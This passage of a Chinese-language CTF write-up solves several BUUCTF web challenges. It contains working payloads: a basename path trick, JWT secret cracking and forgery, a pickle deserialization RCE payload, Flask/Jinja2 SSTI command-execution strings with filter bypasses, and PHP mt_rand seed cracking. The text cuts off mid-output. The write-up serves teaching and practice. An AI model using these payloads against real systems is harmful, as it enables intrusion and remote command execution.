而题目中的正则表达式尾部时<code>$</code>,表示匹配尾部为<code>config.php/</code>的字符串,而这里在尾部又加了其他字符,所以也就匹配不到了</p><p>另外, 必须给<code>index.php</code>传参<code>source</code>才能触发读取文件,所以最后的payload可以为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://96993b6d-bf64-4b7c-be18-69e708540bca.node4.buuoj.cn:81/index.php/config.php/%ff?source=1</span><br></pre></td></tr></table></figure><p>这里传<code>/index.php/config.php</code>不影响访问<code>index.php</code></p><p>而在<code>basename</code>处理时,其会首先删除路径部分, 也就是<code>index.php/</code>,然后删除后面<code>%ff</code>,最后的结果为<code>config.php</code>,成功读取</p><br><hr><br><h1 id="脚本爆破-JWT-pickle反序列化-ikun"><a href="#脚本爆破-JWT-pickle反序列化-ikun" class="headerlink" title="[脚本爆破,JWT,pickle反序列化]ikun"></a>[脚本爆破,JWT,pickle反序列化]ikun</h1><p><img src="/images/buuctf-web2/image-20221025183851502.png" alt="image-20221025183851502"></p><p><img src="/images/buuctf-web2/image-20221025185149755.png" alt="image-20221025185149755"></p><p>这里说要买到lv6 ,但是不知道是那一页 ,所以先用脚本跑一下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">base_url = <span class="string">&quot;http://1abf08df-2767-4d81-a779-7356c6c5e545.node4.buuoj.cn:81/shop?page=&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line">cookies = &#123;<span class="string">&#x27;_xsrf&#x27;</span>: <span class="string">&#x27;2|c3cd89d3|eee6aaae103a266c0069323a94da635e|1666692736&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;JWT&#x27;</span>: <span class="string">&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjIyMiJ9.3H1j76lr69MYIZ48VY1Jdrjpw-GZdPSSbEwpE0gCR8o&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    url = base_url + <span class="built_in">str</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    res = session.get(url, cookies=cookies).text</span><br><span class="line">    <span class="comment"># print(res)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>在180页发现了lv6</p><p><img src="/images/buuctf-web2/image-20221025185317801.png" alt="image-20221025185317801"></p><p>但是很贵,根本买不起</p><img src="/images/buuctf-web2/image-20221025185716790.png" alt="image-20221025185716790" style="zoom:67%;" /><p>抓包修改价格会显示操作失败, 修改折扣后成功, 出现了 <code>/b1g_m4mber </code>这个地址</p><p>访问后会显示只允许<code>admin</code>访问,这里尝试添加头字段失败后,注意到包中还有<code>JWT</code>这个字段:</p><p><img src="/images/buuctf-web2/image-20221025190252201.png" alt="image-20221025190252201"></p><blockquote><p><code>JWT</code>的全称是<code>JSON Web Token</code>。遵循JSON格式，跨域认证解决方案。声明被存储在<code>客户端</code>，而不是服务端内存中。服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于<code>token</code>的身份验证可以替代传统的cookie+session身份验证方法。</p><p>整个<code>token</code>由三部分组成:<code>header</code>、<code>payload</code>、<code>signature</code>(用于认证信息的完整性)</p><p>其中,<code>header</code>的格式为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span>   <span class="comment">//signature部分的加密算法,可以为None,</span></span><br><span class="line"> <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span>      <span class="comment">//声明类型为JWT</span></span><br><span class="line">&gt;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>payload</code>格式为:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;user_role&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;finn&quot;</span><span class="punctuation">,</span>    <span class="comment">//当前登录用户</span></span><br><span class="line">   <span class="attr">&quot;iss&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span>          <span class="comment">//该JWT的签发者,有些是URL</span></span><br><span class="line">   <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1573440582</span><span class="punctuation">,</span>        <span class="comment">//签发时间</span></span><br><span class="line">   <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1573940267</span><span class="punctuation">,</span>        <span class="comment">//过期时间</span></span><br><span class="line">   <span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span> <span class="number">1573440582</span><span class="punctuation">,</span>        <span class="comment">//该时间之前不接收处理该Token</span></span><br><span class="line">   <span class="attr">&quot;domain&quot;</span><span class="punctuation">:</span> <span class="string">&quot;example.com&quot;</span><span class="punctuation">,</span>   <span class="comment">//面向的用户</span></span><br><span class="line">   <span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dff4214121e83057655e10bd9751d657&quot;</span>   <span class="comment">//Token唯一标识</span></span><br><span class="line">&gt;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>signature</code>通过指定的加密算法, <strong>以及一个用户指定的<code>secret_key</code>,</strong> 对<code>header</code>、<code>payload</code>两部分进行计算得到. 签名可以为空,如果这样设置, 任何token都可以通过服务器的认证</p><p><code>header</code>、<code>payload</code>使用<code>base64url</code>编码, 所以和明文没什么区别</p></blockquote><p>使用<code>c-jwt-cracker</code>工具可以对用于计算<code>signature</code>进行爆破 (只能爆破弱密钥)</p><p>使用<code>jwt_tool</code>可以对<code>JWT token</code>进行解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/c-jwt-cracker/c-jwt-cracker]</span><br><span class="line">└─$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjIyMiJ9.3H1j76lr69MYIZ48VY1Jdrjpw-GZdPSSbEwpE0gCR8o   </span><br><span class="line">Secret is &quot;1Kun&quot;</span><br><span class="line"></span><br><span class="line">python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.03HaDCk7C7vfJw9Wa-yDflSMoeV_1jpCaTILcgJXpZY</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/buuctf-web2/image-20221025193722302.png" alt="image-20221025193722302"></p><p><a href="https://jwt.io/">https://jwt.io/</a></p><p>这里拿到爆破所得的<code>secret_key</code>, 并在解密后将<code>payload</code>中的<code>username</code>字段的值改为<code>admin</code></p><p>从而计算得到一个新的<code>JWT token</code></p><img src="/images/buuctf-web2/image-20221025194112546.png" alt="image-20221025194112546" style="zoom:67%;" /><p>用新<code>token</code>来访问<code>/b1g_m4mber </code>,成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web2/image-20221025194237910.png" alt="image-20221025194237910" style="zoom:80%;" /><p>去下载<code>&quot;/static/asd1f654e683wq/www.zip&quot;</code></p><p>翻一下代码, 在<code>admin.py</code>中找到了可利用的<code>pickle</code>反序列化漏洞:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>这里对传进来的参数<code>become</code>用<code>unquote</code>解码之后, 使用<code>pickle.loads</code>来进行反序列化</p><p>这么这里就需要在<code>become</code>中构建序列化的字符串: (这里需要使用python2)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">输出:</span></span><br><span class="line"><span class="string">c__builtin__</span></span><br><span class="line"><span class="string">eval</span></span><br><span class="line"><span class="string">p0</span></span><br><span class="line"><span class="string">(S&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span></span><br><span class="line"><span class="string">p1</span></span><br><span class="line"><span class="string">tp2</span></span><br><span class="line"><span class="string">Rp3</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>然后将最后这个编码后的字符串传给<code>become</code>参数</p><p>这里使用burpsuite传参时会一直403, 那么直接使用浏览器: 先使用hackbar添加cookie中的<code>JWT</code>从而访问到<code>/b1g_m4mber</code></p><p>对比bp和浏览器: 浏览器中好像少了个输入框</p><p><img src="/images/buuctf-web2/image-20221025225155819.png" alt="image-20221025225155819"></p><p>在<code>元素</code>中搜索<code>become</code>看看这个参数是在哪传的:</p><p><img src="/images/buuctf-web2/image-20221025225310131.png" alt="image-20221025225310131"></p><p>可以看到输入<code>become</code>的位置加了隐藏<code>hidden</code>属性</p><p>这里将这个属性删除, 发现出现了输入框,将前面得出的payload输入:然后点击按钮, flag就被读取出来了</p><img src="/images/buuctf-web2/image-20221025225510518.png" alt="image-20221025225510518" style="zoom:67%;" /><br><hr><br><h1 id="FlaskSSTI-bypass-FlaskLight"><a href="#FlaskSSTI-bypass-FlaskLight" class="headerlink" title="[FlaskSSTI,bypass]FlaskLight"></a>[FlaskSSTI,bypass]FlaskLight</h1><img src="/images/buuctf-web2/image-20221026094350556.png" alt="image-20221026094350556" style="zoom:67%;" /><p>存在<code>SSTI</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;config&#125;&#125;</span><br><span class="line"></span><br><span class="line">&lt;Config &#123;&#x27;JSON_AS_ASCII&#x27;: True, &#x27;USE_X_SENDFILE&#x27;: False, &#x27;SESSION_COOKIE_SECURE&#x27;: False, &#x27;SESSION_COOKIE_PATH&#x27;: None, &#x27;SESSION_COOKIE_DOMAIN&#x27;: False, &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;, &#x27;MAX_COOKIE_SIZE&#x27;: 4093, &#x27;SESSION_COOKIE_SAMESITE&#x27;: None, &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;ENV&#x27;: &#x27;production&#x27;, &#x27;DEBUG&#x27;: False, &#x27;SECRET_KEY&#x27;: &#x27;CCC&#123;f4k3_Fl49_:v&#125; CCC&#123;the_flag_is_this_dir&#125;&#x27;, &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False, &#x27;MAX_CONTENT_LENGTH&#x27;: None, &#x27;APPLICATION_ROOT&#x27;: &#x27;/&#x27;, &#x27;SERVER_NAME&#x27;: None, &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;, &#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;: False, &#x27;TESTING&#x27;: False, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(31), &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None, &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: None, &#x27;JSON_SORT_KEYS&#x27;: True, &#x27;JSONIFY_MIMETYPE&#x27;: &#x27;application/json&#x27;, &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True, &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: datetime.timedelta(0, 43200), &#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;: None, &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True, &#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False&#125;&gt;</span><br><span class="line"></span><br><span class="line">SECRET_KEY: CCC&#123;f4k3_Fl49_:v&#125; CCC&#123;the_flag_is_this_dir&#125;</span><br><span class="line">这个没什么用</span><br></pre></td></tr></table></figure><p>读文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search=&#123;&#123;[].__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line">疑似用户:www-data</span><br></pre></td></tr></table></figure><p>下面尝试命令执行的时候发现过滤了很多关键词</p><p>查找基类和子类都没有问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0]&#125;&#125;</span><br><span class="line">输出:&lt;type &#x27;object&#x27;&gt;</span><br><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()&#125;&#125;</span><br><span class="line">输出子类列表</span><br><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59]&#125;&#125;</span><br><span class="line">输出&lt;class &#x27;warnings.catch_warnings&#x27;&gt;</span><br></pre></td></tr></table></figure><p>具体执行命令时会爆500</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line">500</span><br></pre></td></tr></table></figure><p>两种绕过方法:</p><p>1.通过<code>request.args.x</code>使用其他参数来传关键词</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59][request.args.a][request.args.b][request.args.c][request.args.d](request.args.e)&#125;&#125;&amp;a=__init__&amp;b=__globals__&amp;c=__builtins__&amp;d=eval&amp;e=__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()</span><br><span class="line"></span><br><span class="line">bin boot dev etc flasklight home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br><span class="line"></span><br><span class="line">/flasklight : app.py coomme_geeeett_youur_flek</span><br><span class="line"></span><br><span class="line">?search=&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59][request.args.a][request.args.b][request.args.c][request.args.d](request.args.e)&#125;&#125;&amp;a=__init__&amp;b=__globals__&amp;c=__builtins__&amp;d=eval&amp;e=__import__(&#x27;os&#x27;).popen(&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;).read()</span><br><span class="line">flag&#123;add0f032-3cdb-40b9-aa25-cd53d5c146fd&#125;</span><br></pre></td></tr></table></figure><p>2.字符串拼接:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__[&quot;__glo&quot;+&quot;bals__&quot;][&#x27;__bui&#x27;+&#x27;ltins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="伪随机数-枯燥的抽奖"><a href="#伪随机数-枯燥的抽奖" class="headerlink" title="[伪随机数]枯燥的抽奖"></a>[伪随机数]枯燥的抽奖</h1><p>这种一般都不能硬猜吧</p><img src="/images/buuctf-web2/image-20221026100046964.png" alt="image-20221026100046964" style="zoom:80%;" /><p>源码发现了<code>check&#39;.php</code></p><p><img src="/images/buuctf-web2/image-20221026100104694.png" alt="image-20221026100104694"></p><p>访问拿到代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">chcRo2MtG9</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125; <span class="comment">//对于同一个种子来说, 这20轮循环中每次随机到的数都是相同的</span></span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>伪随机数是用确定性的算法计算出来的随机数序列，它并不真正的随机，但具有类似于随机数的统计特征，如均匀性、独立性等。在计算伪随机数时，<span style='color:black;background:yellow;font-family:hei;font-weight:bold'>若使用的初值（种子）不变，那么伪随机数的数序也不变</span>:。伪随机数可以用计算机大量生成，在模拟研究中为了提高模拟效率，一般采用伪随机数代替真正的随机数。模拟中使用的一般是循环周期极长并能通过随机数检验的伪随机数，以保证计算结果的随机性。伪随机数的生成方法有线性同余法、单向散列函数法、密码法等。</p><p><strong><code>mt_rand</code>就是一个伪随机数生成函数，它由可确定的函数，通过一个种子产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。</strong></p></blockquote><p>这里可以用<code>php_mt_seed</code>来爆破种子, 有两种类型的数据可以提交, 一是某个种子的第一个<code>mt_rand</code>生成出来的完整数, 或者提交已知的多个随机数序列,使用方法为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_mt_seed xxx  这里xxx是用 mt_srand 播种后生成的第一个伪随机数</span><br><span class="line">php_mt_seed a1 b1 c1 d1 a2 b2 c2 d2 a3 b3 c3 d3  其中a1,b1为在某个范围内生成的随机数, c1,d1是生成随机数时mt_rand指定的生成范围</span><br><span class="line">例如第一次调用mt_rand(0,61) = 2 第二次调用mt_rand(0,61) = 30</span><br><span class="line">那么这里就是php_mt_seed 2 2 0 61 30 30 0 61</span><br></pre></td></tr></table></figure><p>那么使用脚本将目前已知的串转化为上面的形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">b = <span class="string">&quot;chcRo2MtG9&quot;</span></span><br><span class="line"></span><br><span class="line">string = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> b:</span><br><span class="line">    string += <span class="built_in">str</span>(a.index(c)) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(a.index(c)) + <span class="string">&#x27; 0 61 &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(string)</span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line"><span class="number">2</span> <span class="number">2</span> <span class="number">0</span> <span class="number">61</span> <span class="number">7</span> <span class="number">7</span> <span class="number">0</span> <span class="number">61</span> <span class="number">2</span> <span class="number">2</span> <span class="number">0</span> <span class="number">61</span> <span class="number">53</span> <span class="number">53</span> <span class="number">0</span> <span class="number">61</span> <span class="number">14</span> <span class="number">14</span> <span class="number">0</span> <span class="number">61</span> <span class="number">28</span> <span class="number">28</span> <span class="number">0</span> <span class="number">61</span> <span class="number">48</span> <span class="number">48</span> <span class="number">0</span> <span class="number">61</span> <span class="number">19</span> <span class="number">19</span> <span class="number">0</span> <span class="number">61</span> <span class="number">42</span> <span class="number">42</span> <span class="number">0</span> <span class="number">61</span> <span class="number">35</span> <span class="number">35</span> <span class="number">0</span> <span class="number">61</span> </span><br></pre></td></tr></table></figure><p>利用<code>php_mt_seed</code>来爆破种子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/php_mt_seed-4.0]</span><br><span class="line">└─$ ./php_mt_seed 2 2 0 61 7 7 0 61 2 2 0 61 53 53 0 61 14 14 0 61 28 28 0 61 48 48 0 61 19 19 0 61 42 42 0 61 35 35 0 61        </span><br><span class="line">Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62</span><br><span class="line">Version: 3.0.7 to 5.2.0</span><br><span class="line">Found 0, trying 0xfc000000 - 0xffffffff, speed 1526.3 Mseeds/s </span><br><span class="line">Version: 5.2.1+</span><br><span class="line">Found 0, trying 0x0e000000 - 0x0fffffff, speed 